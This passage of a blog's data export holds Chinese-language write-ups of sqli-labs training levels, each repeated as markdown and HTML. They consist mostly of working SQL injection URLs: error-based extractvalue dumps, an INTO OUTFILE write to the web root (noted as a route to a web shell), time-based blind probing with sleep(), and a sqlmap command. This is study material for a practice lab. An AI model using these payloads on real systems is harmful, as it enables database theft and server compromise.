alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;j5429wlony&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-60/?id=1&quot;)+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_RPNY)from challenges.j5429wlony),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-60/004.png\" alt=\"004\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-60/005.png\" alt=\"005\"></p>\n"},{"title":"sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求","date":"2018-11-29T03:46:49.000Z","_content":"\n# sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求\n\n------\n\n## 手注\n\n对常见的`'))`进行测试\n\n`http://10.60.17.35:8082/Less-61/?id=1'`\n\n发现报错\n\n![001](/img/sql/Lesson-61/001.png)\n\n最终测试出闭合`'))`\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![002](/img/sql/Lesson-61/002.png)\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![003](/img/sql/Lesson-61/003.png)\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='l38s5fjaki'),0x7e))%23`\n\n![004](/img/sql/Lesson-61/004.png)\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_Y1R9)from challenges.l38s5fjaki),0x7e))%23`\n\n![005](/img/sql/Lesson-61/005.png)\n\n提交\n\n![006](/img/sql/Lesson-61/006.png)\n\n","source":"_posts/sqli-labs-lession-61-GET-双注入-变化4-仅允许5次请求.md","raw":"---\ntitle: sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求\ndate: 2018-11-29 11:46:49\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求\n\n------\n\n## 手注\n\n对常见的`'))`进行测试\n\n`http://10.60.17.35:8082/Less-61/?id=1'`\n\n发现报错\n\n![001](/img/sql/Lesson-61/001.png)\n\n最终测试出闭合`'))`\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![002](/img/sql/Lesson-61/002.png)\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`\n\n![003](/img/sql/Lesson-61/003.png)\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='l38s5fjaki'),0x7e))%23`\n\n![004](/img/sql/Lesson-61/004.png)\n\n`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_Y1R9)from challenges.l38s5fjaki),0x7e))%23`\n\n![005](/img/sql/Lesson-61/005.png)\n\n提交\n\n![006](/img/sql/Lesson-61/006.png)\n\n","slug":"sqli-labs-lession-61-GET-双注入-变化4-仅允许5次请求","published":1,"updated":"2019-06-19T17:23:13.398Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istfz00794dsbreayxxy1","content":"<h1 id=\"sqli-labs-lession-61-GET-双注入-变化4-仅允许5次请求\"><a href=\"#sqli-labs-lession-61-GET-双注入-变化4-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求\"></a>sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>对常见的<code>&#39;))</code>进行测试</p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;</code></p>\n<p>发现报错</p>\n<p><img src=\"/img/sql/Lesson-61/001.png\" alt=\"001\"></p>\n<p>最终测试出闭合<code>&#39;))</code></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;l38s5fjaki&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/004.png\" alt=\"004\"></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_Y1R9)from challenges.l38s5fjaki),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/005.png\" alt=\"005\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-61/006.png\" alt=\"006\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-61-GET-双注入-变化4-仅允许5次请求\"><a href=\"#sqli-labs-lession-61-GET-双注入-变化4-仅允许5次请求\" class=\"headerlink\" title=\"sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求\"></a>sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求</h1><hr>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>对常见的<code>&#39;))</code>进行测试</p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;</code></p>\n<p>发现报错</p>\n<p><img src=\"/img/sql/Lesson-61/001.png\" alt=\"001\"></p>\n<p>最终测试出闭合<code>&#39;))</code></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema=&#39;challenges&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema=&#39;challenges&#39;+and+table_name=&#39;l38s5fjaki&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/004.png\" alt=\"004\"></p>\n<p><code>http://10.60.17.35:8082/Less-61/?id=1&#39;))+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_Y1R9)from challenges.l38s5fjaki),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-61/005.png\" alt=\"005\"></p>\n<p>提交</p>\n<p><img src=\"/img/sql/Lesson-61/006.png\" alt=\"006\"></p>\n"},{"title":"sqli-labs-lession 7 文件导入","date":"2018-09-25T13:58:44.000Z","_content":"# sqli-labs-lession 7 文件导入 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-7/1.png)\n\n## 注入 ##\n\n提示使用`Use outfile`,本关使用文件导入的方式进行注入。\n\n### 处理参数 ###\n\n日常测试\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1'`\n\n![2](/img/sql/Lesson-7/2.png)\n\n返回报错信息\n\n猜测是单引号闭合\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1' or 1=1%23`\n\n![3](/img/sql/Lesson-7/3.png)\n\n构造失败,猜测有括号闭合,尝试一下:\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1') or 1=1%23`\n\n还是不行,再加一个括号闭合\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1')) or 1=1%23`\n\n![4](/img/sql/Lesson-7/4.png)\n\n返回成功的页面。查看源码检验。\n\n![5](/img/sql/Lesson-7/5.png)\n\n果然如此。\n\n### 利用文件导入 ###\n\n和往常一样3列\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1')) order by 3%23`\n\n需要设置文件路径:(`\\\\`避免路径出错)\n\n`C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\`\n\n![6](/img/sql/Lesson-7/6.png)\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1')) union select 1,2,3 into outfile \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\1.txt\"%23`\n\n![10](/img/sql/Lesson-7/10.png)\n\n虽然上面报错了,但是我的文件成功插入了。\n\n![11](/img/sql/Lesson-7/11.png)\n\n这个漏洞可以用来上传一句话木马。\n\n### 可能遇到的错误 ###\n\n#### secure-file-priv ####\n\n如果文件导入不成功,确认Mysql配置文件`my.ini`下存在`secure-file-priv`\n\nsecure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。\n\n* secure_file_priv的值为null ，表示限制mysqld不允许导入|导出\n\n* secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下\n\n* secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制\n\n使用命令`show global variables like '%secure%';`查看`secure-file-priv`参数的值：\n\n![7](/img/sql/Lesson-7/7.png)\n\n在phpMyadmin中查询命令也可以发现`secure-file-priv`拒绝执行语句\n\n![8](/img/sql/Lesson-7/8.png)\n\n修改`my.ini`添加`secure-file-priv`参数,没有填具体值表示不做限制(这样做其实很危险)\n\n![9](/img/sql/Lesson-7/9.png)\n\n<font color=red>保存好后重启MYSQL</font>\n\n","source":"_posts/sqli-labs-lession-7-文件导入.md","raw":"---\ntitle: sqli-labs-lession 7 文件导入\ndate: 2018-09-25 21:58:44\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs-lession 7 文件导入 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-7/1.png)\n\n## 注入 ##\n\n提示使用`Use outfile`,本关使用文件导入的方式进行注入。\n\n### 处理参数 ###\n\n日常测试\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1'`\n\n![2](/img/sql/Lesson-7/2.png)\n\n返回报错信息\n\n猜测是单引号闭合\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1' or 1=1%23`\n\n![3](/img/sql/Lesson-7/3.png)\n\n构造失败,猜测有括号闭合,尝试一下:\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1') or 1=1%23`\n\n还是不行,再加一个括号闭合\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1')) or 1=1%23`\n\n![4](/img/sql/Lesson-7/4.png)\n\n返回成功的页面。查看源码检验。\n\n![5](/img/sql/Lesson-7/5.png)\n\n果然如此。\n\n### 利用文件导入 ###\n\n和往常一样3列\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1')) order by 3%23`\n\n需要设置文件路径:(`\\\\`避免路径出错)\n\n`C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\`\n\n![6](/img/sql/Lesson-7/6.png)\n\n`http://10.60.250.151/sqlilabs/Less-7/?id=1')) union select 1,2,3 into outfile \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\1.txt\"%23`\n\n![10](/img/sql/Lesson-7/10.png)\n\n虽然上面报错了,但是我的文件成功插入了。\n\n![11](/img/sql/Lesson-7/11.png)\n\n这个漏洞可以用来上传一句话木马。\n\n### 可能遇到的错误 ###\n\n#### secure-file-priv ####\n\n如果文件导入不成功,确认Mysql配置文件`my.ini`下存在`secure-file-priv`\n\nsecure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。\n\n* secure_file_priv的值为null ，表示限制mysqld不允许导入|导出\n\n* secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下\n\n* secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制\n\n使用命令`show global variables like '%secure%';`查看`secure-file-priv`参数的值：\n\n![7](/img/sql/Lesson-7/7.png)\n\n在phpMyadmin中查询命令也可以发现`secure-file-priv`拒绝执行语句\n\n![8](/img/sql/Lesson-7/8.png)\n\n修改`my.ini`添加`secure-file-priv`参数,没有填具体值表示不做限制(这样做其实很危险)\n\n![9](/img/sql/Lesson-7/9.png)\n\n<font color=red>保存好后重启MYSQL</font>\n\n","slug":"sqli-labs-lession-7-文件导入","published":1,"updated":"2019-06-19T17:23:13.400Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istg3007d4dsbtjpuocqj","content":"<h1 id=\"sqli-labs-lession-7-文件导入\"><a href=\"#sqli-labs-lession-7-文件导入\" class=\"headerlink\" title=\"sqli-labs-lession 7 文件导入\"></a>sqli-labs-lession 7 文件导入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-7/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>提示使用<code>Use outfile</code>,本关使用文件导入的方式进行注入。</p>\n<h3 id=\"处理参数\"><a href=\"#处理参数\" class=\"headerlink\" title=\"处理参数\"></a>处理参数</h3><p>日常测试</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-7/2.png\" alt=\"2\"></p>\n<p>返回报错信息</p>\n<p>猜测是单引号闭合</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39; or 1=1%23</code></p>\n<p><img src=\"/img/sql/Lesson-7/3.png\" alt=\"3\"></p>\n<p>构造失败,猜测有括号闭合,尝试一下:</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;) or 1=1%23</code></p>\n<p>还是不行,再加一个括号闭合</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;)) or 1=1%23</code></p>\n<p><img src=\"/img/sql/Lesson-7/4.png\" alt=\"4\"></p>\n<p>返回成功的页面。查看源码检验。</p>\n<p><img src=\"/img/sql/Lesson-7/5.png\" alt=\"5\"></p>\n<p>果然如此。</p>\n<h3 id=\"利用文件导入\"><a href=\"#利用文件导入\" class=\"headerlink\" title=\"利用文件导入\"></a>利用文件导入</h3><p>和往常一样3列</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;)) order by 3%23</code></p>\n<p>需要设置文件路径:(<code>\\\\</code>避免路径出错)</p>\n<p><code>C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\</code></p>\n<p><img src=\"/img/sql/Lesson-7/6.png\" alt=\"6\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\1.txt&quot;%23</code></p>\n<p><img src=\"/img/sql/Lesson-7/10.png\" alt=\"10\"></p>\n<p>虽然上面报错了,但是我的文件成功插入了。</p>\n<p><img src=\"/img/sql/Lesson-7/11.png\" alt=\"11\"></p>\n<p>这个漏洞可以用来上传一句话木马。</p>\n<h3 id=\"可能遇到的错误\"><a href=\"#可能遇到的错误\" class=\"headerlink\" title=\"可能遇到的错误\"></a>可能遇到的错误</h3><h4 id=\"secure-file-priv\"><a href=\"#secure-file-priv\" class=\"headerlink\" title=\"secure-file-priv\"></a>secure-file-priv</h4><p>如果文件导入不成功,确认Mysql配置文件<code>my.ini</code>下存在<code>secure-file-priv</code></p>\n<p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>\n<ul>\n<li><p>secure_file_priv的值为null ，表示限制mysqld不允许导入|导出</p>\n</li>\n<li><p>secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下</p>\n</li>\n<li><p>secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制</p>\n</li>\n</ul>\n<p>使用命令<code>show global variables like &#39;%secure%&#39;;</code>查看<code>secure-file-priv</code>参数的值：</p>\n<p><img src=\"/img/sql/Lesson-7/7.png\" alt=\"7\"></p>\n<p>在phpMyadmin中查询命令也可以发现<code>secure-file-priv</code>拒绝执行语句</p>\n<p><img src=\"/img/sql/Lesson-7/8.png\" alt=\"8\"></p>\n<p>修改<code>my.ini</code>添加<code>secure-file-priv</code>参数,没有填具体值表示不做限制(这样做其实很危险)</p>\n<p><img src=\"/img/sql/Lesson-7/9.png\" alt=\"9\"></p>\n<p><font color=\"red\">保存好后重启MYSQL</font></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-7-文件导入\"><a href=\"#sqli-labs-lession-7-文件导入\" class=\"headerlink\" title=\"sqli-labs-lession 7 文件导入\"></a>sqli-labs-lession 7 文件导入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-7/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>提示使用<code>Use outfile</code>,本关使用文件导入的方式进行注入。</p>\n<h3 id=\"处理参数\"><a href=\"#处理参数\" class=\"headerlink\" title=\"处理参数\"></a>处理参数</h3><p>日常测试</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-7/2.png\" alt=\"2\"></p>\n<p>返回报错信息</p>\n<p>猜测是单引号闭合</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39; or 1=1%23</code></p>\n<p><img src=\"/img/sql/Lesson-7/3.png\" alt=\"3\"></p>\n<p>构造失败,猜测有括号闭合,尝试一下:</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;) or 1=1%23</code></p>\n<p>还是不行,再加一个括号闭合</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;)) or 1=1%23</code></p>\n<p><img src=\"/img/sql/Lesson-7/4.png\" alt=\"4\"></p>\n<p>返回成功的页面。查看源码检验。</p>\n<p><img src=\"/img/sql/Lesson-7/5.png\" alt=\"5\"></p>\n<p>果然如此。</p>\n<h3 id=\"利用文件导入\"><a href=\"#利用文件导入\" class=\"headerlink\" title=\"利用文件导入\"></a>利用文件导入</h3><p>和往常一样3列</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;)) order by 3%23</code></p>\n<p>需要设置文件路径:(<code>\\\\</code>避免路径出错)</p>\n<p><code>C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\</code></p>\n<p><img src=\"/img/sql/Lesson-7/6.png\" alt=\"6\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7\\\\1.txt&quot;%23</code></p>\n<p><img src=\"/img/sql/Lesson-7/10.png\" alt=\"10\"></p>\n<p>虽然上面报错了,但是我的文件成功插入了。</p>\n<p><img src=\"/img/sql/Lesson-7/11.png\" alt=\"11\"></p>\n<p>这个漏洞可以用来上传一句话木马。</p>\n<h3 id=\"可能遇到的错误\"><a href=\"#可能遇到的错误\" class=\"headerlink\" title=\"可能遇到的错误\"></a>可能遇到的错误</h3><h4 id=\"secure-file-priv\"><a href=\"#secure-file-priv\" class=\"headerlink\" title=\"secure-file-priv\"></a>secure-file-priv</h4><p>如果文件导入不成功,确认Mysql配置文件<code>my.ini</code>下存在<code>secure-file-priv</code></p>\n<p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>\n<ul>\n<li><p>secure_file_priv的值为null ，表示限制mysqld不允许导入|导出</p>\n</li>\n<li><p>secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下</p>\n</li>\n<li><p>secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制</p>\n</li>\n</ul>\n<p>使用命令<code>show global variables like &#39;%secure%&#39;;</code>查看<code>secure-file-priv</code>参数的值：</p>\n<p><img src=\"/img/sql/Lesson-7/7.png\" alt=\"7\"></p>\n<p>在phpMyadmin中查询命令也可以发现<code>secure-file-priv</code>拒绝执行语句</p>\n<p><img src=\"/img/sql/Lesson-7/8.png\" alt=\"8\"></p>\n<p>修改<code>my.ini</code>添加<code>secure-file-priv</code>参数,没有填具体值表示不做限制(这样做其实很危险)</p>\n<p><img src=\"/img/sql/Lesson-7/9.png\" alt=\"9\"></p>\n<p><font color=\"red\">保存好后重启MYSQL</font></p>\n"},{"title":"sqli-labs-lession 9 GET单引号基于时间盲注","date":"2018-09-26T10:57:13.000Z","_content":"# sqli-labs-lession 9 GET单引号基于时间盲注 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-9/1.png)\n\n## 手注 ##\n\n### 时间盲注函数 ###\n\n* sleep()函数\n\t\n\tsleep(n):静止n秒,n是个变量\n\n* if(1,2,3)\n\n\t如果1为真,执行2,否则执行3\n\n### 判断类型 ###\n\n在这个页面的`?id=1`后写入任何数据都没有结果返回,永远都是`You are in...........`的界面。\n\n利用if函数来判断类型。\n\n先查看源码\n\n![2](/img/sql/Lesson-9/2.png)\n\n`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n\n注意到源码是单引号闭合的。并且无论数据库语句执行成功失败都不会返回信息。\n\n可是如果我传入一个用if函数构造的语句\n\n`1' and if(1,sleep(60),null)#`\n\nSQL语句会变成\n\n`$sql=\"SELECT * FROM users WHERE id='1' and if(1,sleep(60),null) #' LIMIT 0,1\";`\n\n如果被数据库成功解析,就会执行`sleep(60)`,页面就会转60s,即证明$id\n被一个`''`包起来。\n\n测试一下。\n\n![3](/img/sql/Lesson-9/3.png)\n\n可以发现左上角一直在转,果然是单引号闭合的时间盲注。\n\n### 获取数据库 ####\n\n#### 获取数据库长度 ####\n\n![4](/img/sql/Lesson-9/4.png)\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(8=(length(database())),sleep(60),null)%23`\n\n#### 获取数据库名 ####\n\n猜第一个字符\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('s'=left(database(),1),sleep(60),null)%23`\n\n![5](/img/sql/Lesson-9/5.png)\n\n猜第二个\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('se'=left(database(),2),sleep(60),null)%23`\n\n![6](/img/sql/Lesson-9/6.png)\n\n中间省略了,可以用其他的方式,推荐二分法\n\n最后猜解出数据库名\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('security'=left(database(),8),sleep(60),null)%23`\n\n![7](/img/sql/Lesson-9/7.png)\n\n数据库名为`security`\n\n### 获取表 ###\n\n#### 表数目 ####\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(4=(select count(table_name) from information_schema.tables where table_schema='security'),sleep(60),null)%23`\n\n![8](/img/sql/Lesson-9/8.png)\n\n#### 表长度 ####\n\n以获取第一张表为例(第一张表是emails,玩旧了都记住了):\n\n又在一直转了,说明第一张表长度为6。\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(6=length((select table_name from information_schema.tables where table_schema='security' limit 0,1)),sleep(60),null)%23`\n\n![9](/img/sql/Lesson-9/9.png)\n\n#### 表名 ####\n\n这里过一遍二分法吧,免得忘了。一般从ascii码95~123。\n\nTrue表示页面加载,False表示不加载。用第4张表(其实我知道是users表)测试。\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(95<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n95:True\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(109<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n109:True\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(116<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n116:True\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(120<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n120:False\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(118<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n118:False\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(117=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n117:True\n\n117的ascii码为`u`,第4张表的第一个字符为`u`。\n\n剩下的过程就不写了。都是相同的原里,把要查询的东西填到`if(1,2,3)`的1中就行了。\n\n## SQLMAP ##\n\n`sqlmap -u 10.60.250.151/sqlilabs/Less-9/?id=1 --technique T --dbs`\n\n--technique T:表示测试时间延迟注入、\n\n这种方式需要大量的时间\n\n![10](/img/sql/Lesson-9/10.png)\n\n![11](/img/sql/Lesson-9/11.png)\n\n剩下的就不表了。","source":"_posts/sqli-labs-lession-9-GET单引号基于时间盲注.md","raw":"---\ntitle: sqli-labs-lession 9 GET单引号基于时间盲注\ndate: 2018-09-26 18:57:13\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs-lession 9 GET单引号基于时间盲注 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-9/1.png)\n\n## 手注 ##\n\n### 时间盲注函数 ###\n\n* sleep()函数\n\t\n\tsleep(n):静止n秒,n是个变量\n\n* if(1,2,3)\n\n\t如果1为真,执行2,否则执行3\n\n### 判断类型 ###\n\n在这个页面的`?id=1`后写入任何数据都没有结果返回,永远都是`You are in...........`的界面。\n\n利用if函数来判断类型。\n\n先查看源码\n\n![2](/img/sql/Lesson-9/2.png)\n\n`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n\n注意到源码是单引号闭合的。并且无论数据库语句执行成功失败都不会返回信息。\n\n可是如果我传入一个用if函数构造的语句\n\n`1' and if(1,sleep(60),null)#`\n\nSQL语句会变成\n\n`$sql=\"SELECT * FROM users WHERE id='1' and if(1,sleep(60),null) #' LIMIT 0,1\";`\n\n如果被数据库成功解析,就会执行`sleep(60)`,页面就会转60s,即证明$id\n被一个`''`包起来。\n\n测试一下。\n\n![3](/img/sql/Lesson-9/3.png)\n\n可以发现左上角一直在转,果然是单引号闭合的时间盲注。\n\n### 获取数据库 ####\n\n#### 获取数据库长度 ####\n\n![4](/img/sql/Lesson-9/4.png)\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(8=(length(database())),sleep(60),null)%23`\n\n#### 获取数据库名 ####\n\n猜第一个字符\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('s'=left(database(),1),sleep(60),null)%23`\n\n![5](/img/sql/Lesson-9/5.png)\n\n猜第二个\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('se'=left(database(),2),sleep(60),null)%23`\n\n![6](/img/sql/Lesson-9/6.png)\n\n中间省略了,可以用其他的方式,推荐二分法\n\n最后猜解出数据库名\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if('security'=left(database(),8),sleep(60),null)%23`\n\n![7](/img/sql/Lesson-9/7.png)\n\n数据库名为`security`\n\n### 获取表 ###\n\n#### 表数目 ####\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(4=(select count(table_name) from information_schema.tables where table_schema='security'),sleep(60),null)%23`\n\n![8](/img/sql/Lesson-9/8.png)\n\n#### 表长度 ####\n\n以获取第一张表为例(第一张表是emails,玩旧了都记住了):\n\n又在一直转了,说明第一张表长度为6。\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(6=length((select table_name from information_schema.tables where table_schema='security' limit 0,1)),sleep(60),null)%23`\n\n![9](/img/sql/Lesson-9/9.png)\n\n#### 表名 ####\n\n这里过一遍二分法吧,免得忘了。一般从ascii码95~123。\n\nTrue表示页面加载,False表示不加载。用第4张表(其实我知道是users表)测试。\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(95<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n95:True\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(109<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n109:True\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and 